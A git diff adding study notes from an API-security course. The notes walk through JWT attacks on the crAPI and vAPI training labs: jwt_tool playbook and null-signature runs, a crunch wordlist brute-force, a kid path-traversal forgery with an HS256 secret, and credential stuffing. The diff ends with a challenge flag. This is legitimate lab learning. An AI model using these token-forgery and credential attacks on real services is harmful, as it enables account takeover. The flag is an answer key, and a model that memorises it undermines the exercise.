@@ -114,12 +114,92 @@ grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json
 
 ### Token Analysis  
 
->
+>Change ***Postman*** custom proxy to send requests to Burp Suite `127.0.0.1:8080`  
 
-### JWT Attacks  
+>Capture the login POST request, `http://127.0.0.1:8888/identity/api/auth/login`, and send it to Burp Sequencer:  
 
->
+![crapi-burp-sequencer-custom-location-in-response.png](/images/crapi-burp-sequencer-custom-location-in-response.png)  
+
+>Start Live Capture, using the crAPI Burp Sequencer with the custom location of the JWT token value.  
+
+![crAPI burp sequencer results-20000](/images/crapi-burp-sequencer-results-20000.png)  
 
 ### Automating JWT attacks with JWT_Tool  
 
->
+>JWT tool scanning mode playbook:  
+
+>Download copy of wordlist for JWT attacks: [jwt-common.txt](https://raw.githubusercontent.com/ticarpi/jwt_tool/refs/heads/master/jwt-common.txt)  
+
+```
+jwt_tool -t http://127.0.0.1:8888/identity/api/v2/vehicle/vehicles -rh 'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0LmNvbSIsImlhdCI6MTczMDI4NjM5MSwiZXhwIjoxNzMwODkxMTkxLCJyb2xlIjoidXNlciJ9.if-KPemRJ5ze7rqiZPWuY7ZvY9xo-ACeFrd0P0Z_-s7NjG18I22hjl5rWgF9uheq9c7vOqLys-OQcNYp87cr-RBVOsDbDIzsnjmhgH4MDLjzR7XJMaxbZu4vRRzoDmi54yLebhvWeTdMNf8HlYvnZvMhSzvsj9GMKBbI926SfoDEx71BzR23pQg27ekNg6s4Ige5IpvLP3m1rv94kyrMjGsxqHev-fYlS3IrpxM1maAPNPT_j-AGwtgWxt9VtZtx-nsztxY-TUAEAU7_mnPMfE27U_KfnU0IutQja-z1oXDxEIZ__7rqFGLWW1sYQ6C-0OefRAJ-i1T9HC7fwAF6Sw' --mode pb
+```    
+
+>JWT tool attack mode: null
+
+```
+jwt_tool -X a -t http://127.0.0.1:8888/identity/api/v2/vehicle/vehicles -rh 'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0LmNvbSIsImlhdCI6MTczMDI4NjM5MSwiZXhwIjoxNzMwODkxMTkxLCJyb2xlIjoidXNlciJ9.if-KPemRJ5ze7rqiZPWuY7ZvY9xo-ACeFrd0P0Z_-s7NjG18I22hjl5rWgF9uheq9c7vOqLys-OQcNYp87cr-RBVOsDbDIzsnjmhgH4MDLjzR7XJMaxbZu4vRRzoDmi54yLebhvWeTdMNf8HlYvnZvMhSzvsj9GMKBbI926SfoDEx71BzR23pQg27ekNg6s4Ige5IpvLP3m1rv94kyrMjGsxqHev-fYlS3IrpxM1maAPNPT_j-AGwtgWxt9VtZtx-nsztxY-TUAEAU7_mnPMfE27U_KfnU0IutQja-z1oXDxEIZ__7rqFGLWW1sYQ6C-0OefRAJ-i1T9HC7fwAF6Sw'
+```  
+
+>Create a wordlist for brute forcing of JWT token secret using `crunch`  
+
+>Use Crunch, a password-generating tool, to create a list of all possible character combinations to use against crAPI.  
+
+```
+crunch 5 5 -o crAPIpw.txt
+```  
+
+>Crack JWT secret password, fails.
+>JWT is using an RSA asymmetric hashing algorithm, using SHA256, this is a major change from the earlier version of crAPI that used an HMAC symmetric hashing algorithm along with a pretty easy secret to crack).  
+
+```
+jwt_tool eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0Lx <snip> eVpTeFReatAeFEBTkQSGaFN8FQlDwSBPWnXMcA -C -d crAPIpw.txt
+```  
+
+### Key ID (kid) path traversal attack  
+
+```
+jwt_tool <jwt token> -T -S hs256 -p AA==
+```  
+
+>`-T` is the tamper command (to edit the content of the JWT)  
+>`-S` hs256 is to encode the token using an HS256 algorithm  
+>`-p` `AA==` is to sign the token with the secret: `AA==`  
+
+```
+jwt_tool 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0LmNvbSIsImlhdCI6MTczMDI4OTM5NSwiZXhwIjoxNzMwODk0MTk1LCJyb2xlIjoidXNlciJ9.gDKuSWKWReVylR-9HGx9f_7Zxdzgyvge1S5xXbMh1wfZrHS6xDF6XlDPyGuznfjqCPMEvF9A8wfbppJUISWqBYQZDjYgATFtk0akpm7xBBHqg24IEDerq9RA3iCVNGmJaWcIVcu07hMyd3ndsnnuKfJjlyI4_ZvSra2QZawZpT72dFe030Wc9zepaXHopYA-1XdK7qsujqGzbjbNSw2khtyDcgJ1HgxRJ1f_J1mB58CX12X4qNUFRATvV2o1J68hXrl0zuNNuB3KI_AsDKAzeN4F-iK__2WLOZrT9RJTri43enQ6h6zBQ3tO9vwHAxwgeD_F79vnqu8IT5MeptDWOg' --tamper --sign hs256 --password AA==
+```  
+
+– change the algorithm from RS256 to HS256
+– in the token’s header section, add a new parameter called kid and include this value: `../../../../../../dev/null`
+– sign the token using this secret: AA==  
+
+
+>[crapi Challenge 15 – Find a way to forge valid JWT Tokens](https://github.com/OWASP/crAPI/blob/7ceb7fa890f5376fdccacc2346c9d2f32097c59f/docs/challengeSolutions.md#challenge-15---find-a-way-to-forge-valid-jwt-tokens)  
+
+>***Unsolved***  
+
+>Password spraying is a classic authentication attack where an attacker will, Attempt to authenticate using a long list of users and a short list of targeted passwords.  
+
+----  
+
+## API Authentication Attacks Assessment  
+
+>The following resources are helpful when testing vAPI for API authentication weaknesses. 
+
+>[vapi Resources API2 Credential Stuffing](https://github.com/roottusk/vapi/blob/master/Resources/API2_CredentialStuffing/creds.csv)  
+
+When using the credentials found in API2_CredentialStuffing to attack http://vapi.apisec.ai/vapi/api2/user/login, these three email domain names were compromised:  
+
+```
+yahoo.com
+ortiz.com
+beatty.info
+```  
+
+>Which of the following is the flag for sending a successful GET request to http://vapi.apisec.ai/vapi/api2/user/details?  
+
+```
+flag{api2_6bf2beda61e2a1ab2d0a}
+```  
+
+----  
